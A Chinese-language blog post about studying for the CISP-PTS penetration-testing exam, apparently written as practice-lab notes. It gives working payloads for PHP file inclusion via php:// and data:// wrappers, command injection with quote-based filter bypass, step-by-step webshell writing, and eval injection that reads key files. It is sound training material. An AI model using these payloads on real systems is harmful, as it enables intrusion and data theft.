@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ithedogl.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="蚂蚁在小草的阴影下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pts学习">
+<meta property="og:url" content="https://ithedogl.github.io/2021/12/15/pts%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="沉沦">
+<meta property="og:description" content="蚂蚁在小草的阴影下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215172129097.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215172317468.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215172425061.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215172637814.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215172817745.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215173133049.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216235302830.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216235314262.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216235529296.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217000525050.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217171116984.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172232781.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215210650348.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215210730452.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215211022077.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172400840.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172418591.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215211305385.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215211457942.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215211516286.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215211620111.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215212429380.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215212628060.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215212647613.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215213209377.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215213332252.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215213417163.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215213456376.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215213542399.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215213614591.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215213957099.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215213816292.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215214148169.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216235642320.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216235916385.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217171246145.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217171332547.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216231442543.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216231500469.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216232120351.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216232144069.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216232333273.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216232349579.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216233039048.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216233706223.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216233721138.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216234348598.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216234401233.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216234533676.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216234545499.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217170508907.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217170545321.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172709310.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172734526.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172758818.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172826891.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216235028920.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216235040145.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216235114127.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211216235137544.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217170821160.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217170841548.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217171556631.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217171641792.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217171941519.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172000987.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172022858.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217172106460.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217000009524.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217000046096.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211217000209761.png">
+<meta property="article:published_time" content="2021-12-15T09:16:38.791Z">
+<meta property="article:modified_time" content="2021-12-18T01:53:56.652Z">
+<meta property="article:author" content="thedog">
+<meta property="article:tag" content="考证">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ithedogl.github.io/images/pts%E5%AD%A6%E4%B9%A0/image-20211215172129097.png">
+
+<link rel="canonical" href="https://ithedogl.github.io/2021/12/15/pts%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pts学习 | 沉沦</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">沉沦</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ithedogl.github.io/2021/12/15/pts%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="thedog">
+      <meta itemprop="description" content="笑一个">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沉沦">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pts学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-15 17:16:38" itemprop="dateCreated datePublished" datetime="2021-12-15T17:16:38+08:00">2021-12-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-18 09:53:56" itemprop="dateModified" datetime="2021-12-18T09:53:56+08:00">2021-12-18</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/12/15/pts%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/12/15/pts%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <div class="post-description">蚂蚁在小草的阴影下</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">各种方式多尝试</span><br><span class="line">多看源码</span><br><span class="line">多看robots文件</span><br><span class="line">多记命令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1-key1</span><br><span class="line">2-key2</span><br><span class="line">3-key3</span><br><span class="line">4----wireshark</span><br><span class="line">5----3个key</span><br><span class="line">6----3个key</span><br><span class="line"></span><br><span class="line">5-10 题  key</span><br><span class="line">key pte&#x2F;pts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pte   cat ls  管道符   </span><br><span class="line">pts   管道符 直接过滤掉</span><br><span class="line"></span><br><span class="line">vmware   docker</span><br><span class="line"></span><br><span class="line">带上自己的电脑和身份证</span><br><span class="line"></span><br><span class="line">获取KEY值之后需要粘到另一个地方----------粘的对不对，尽力不要手动输入</span><br><span class="line"></span><br><span class="line">PTE考察文件上传  3个过滤条件</span><br><span class="line">PTS              5-4个过滤条件</span><br><span class="line">redis未授权访问+sshkey密钥替换（注意端口    6379-）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">平时练习的时候--题目名字一样---题目内容是不一样的，换个过滤条件就是一个新题</span><br><span class="line">PTE  2次考试机会   PTE 2500元</span><br><span class="line">PTS  3次考试机会   PTS 4000元</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="12-15"><a href="#12-15" class="headerlink" title="12.15"></a>12.15</h3><p>提示在根目录下key.php中</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172129097.png" alt="image-20211215172129097"></p>
+<p>访问一下key.php是200，源码无其他内容</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172317468.png" alt="image-20211215172317468"></p>
+<p>点击进入答题，很明显在file参数</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172425061.png" alt="image-20211215172425061"></p>
+<p>还是要访问view.html看下，源码未发现其他内容</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172637814.png" alt="image-20211215172637814"></p>
+<p>利用伪协议读取base64加密的key.php</p>
+<p><a target="_blank" rel="noopener" href="http://49.232.193.10:83/vulnerabilities/fu1.php?file=php://filter/read=convert.base64-encode/resource=../key.php">http://49.232.193.10:83/vulnerabilities/fu1.php?file=php://filter/read=convert.base64-encode/resource=../key.php</a></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215172817745.png" alt="image-20211215172817745"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215173133049.png" alt="image-20211215173133049"></p>
+<h3 id="12-16"><a href="#12-16" class="headerlink" title="12.16"></a>12.16</h3><p>会自动添加txt后缀</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235302830.png" alt="image-20211216235302830"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235314262.png" alt="image-20211216235314262"></p>
+<p>使用远程包含，考试的时候无法连接外网，只能本地起个http服务</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235529296.png" alt="image-20211216235529296"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;150.158.27.164:83&#x2F;start&#x2F;index.php?page&#x3D;data:text&#x2F;plain,&lt;?php system(&quot;cat ..&#x2F;key.php&quot;)?&gt;?</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000525050.png" alt="image-20211217000525050"></p>
+<h3 id="12-17"><a href="#12-17" class="headerlink" title="12.17"></a>12.17</h3><p>伪协议双写</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171116984.png" alt="image-20211217171116984"></p>
+<h3 id="12-17-1"><a href="#12-17-1" class="headerlink" title="12.17"></a>12.17</h3><p>直接读</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172232781.png" alt="image-20211217172232781"></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="12-15-1"><a href="#12-15-1" class="headerlink" title="12.15"></a>12.15</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215210650348.png" alt="image-20211215210650348"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215210730452.png" alt="image-20211215210730452"></p>
+<p>屏蔽了cat\tac\less\tail\tailf\more\nl\head命令，用单引号绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|c&#39;a&#39;t ..&#x2F;key.*</span><br><span class="line">127.0.0.1|c&#39;a&#39;t ..&#x2F;key*</span><br><span class="line">127.0.0.1|c&#39;a&#39;t ..&#x2F;key.p&#39;h&#39;p</span><br><span class="line">127.0.0.1|c&#39;a&#39;t &#x2F;var&#x2F;www&#x2F;html&#x2F;key*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211022077.png" alt="image-20211215211022077"></p>
+<h3 id="12-17-2"><a href="#12-17-2" class="headerlink" title="12.17"></a>12.17</h3><p>就那样</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172400840.png" alt="image-20211217172400840"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172418591.png" alt="image-20211217172418591"></p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="12-15-2"><a href="#12-15-2" class="headerlink" title="12.15"></a>12.15</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211305385.png" alt="image-20211215211305385"></p>
+<p>寻找返回码200的</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211457942.png" alt="image-20211215211457942"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211516286.png" alt="image-20211215211516286"></p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="12-14"><a href="#12-14" class="headerlink" title="12.14"></a>12.14</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215211620111.png" alt="image-20211215211620111"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); </span><br><span class="line">    &#x2F;*</span><br><span class="line">    Hint:</span><br><span class="line">    get the shell find the key；）\n&quot;;</span><br><span class="line">    *&#x2F;</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;sandbox&#x2F;&#39; . md5(&quot;cisp-pts&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);	&#x2F;&#x2F;拼接出来一个目录，&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;sandbox&#x2F;[cisp-pts27.18.46.118]的md5&#x2F;</span><br><span class="line">    @mkdir($sandbox,0777,true);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    echo strlen($_GET[&#39;cmd&#39;]);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 30) &#123;	&#x2F;&#x2F;如果cmd长度小于30就执行cmd命令，用ecoho分步写马到txt，写到txt是为了方便检查，最后mv成php即可。</span><br><span class="line">        @exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        @exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">echo &quot;&lt;br &#x2F;&gt; IP : &#123;$_SERVER[&#39;REMOTE_ADDR&#39;]&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>路径/usr/local/apache2/htdocs/sandbox/76d99222ba0ed30738b2490dc59580a5/，注意计算md5时echo用-n，即结尾不要回车符，不然就计算的是[cisp-pts27.18.46.118回车符]的md5，不一样了。</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215212429380.png" alt="image-20211215212429380"></p>
+<p>验证路径，403证明存在</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215212628060.png" alt="image-20211215212628060"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215212647613.png" alt="image-20211215212647613"></p>
+<p>尝试执行个命令通过echo到静态文件看结果</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213209377.png" alt="image-20211215213209377"></p>
+<p>分步写马</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213332252.png" alt="image-20211215213332252"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213417163.png" alt="image-20211215213417163"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213456376.png" alt="image-20211215213456376"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213542399.png" alt="image-20211215213542399"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213614591.png" alt="image-20211215213614591"></p>
+<p>最后mv成一个php即可</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213957099.png" alt="image-20211215213957099"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215213816292.png" alt="image-20211215213816292"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211215214148169.png" alt="image-20211215214148169"></p>
+<h3 id="12-16-1"><a href="#12-16-1" class="headerlink" title="12.16"></a>12.16</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;key4.php&quot;;</span><br><span class="line">$PTE &#x3D; &quot;CISP-PTE&quot;;</span><br><span class="line">$str &#x3D; $_GET[&#39;str&#39;];</span><br><span class="line">if (unserialize($str) &#x3D;&#x3D;&#x3D; &quot;$PTE&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$key4&quot;;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__); </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235642320.png" alt="image-20211216235642320"></p>
+<p>这种反序列化不需要class名和属性名，只需要属性值即可</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235916385.png" alt="image-20211216235916385"></p>
+<h3 id="12-17-3"><a href="#12-17-3" class="headerlink" title="12.17"></a>12.17</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171246145.png" alt="image-20211217171246145"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;key4.php&quot;;</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">eval(&quot;\$o&#x3D;strtolower(\&quot;$a\&quot;);&quot;);</span><br><span class="line">echo $o;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>网上查的，没理解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;150.158.27.164:1084&#x2F;start&#x2F;vul.php?a&#x3D;$&#123;system(&quot;cat key4.php&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171332547.png" alt="image-20211217171332547"></p>
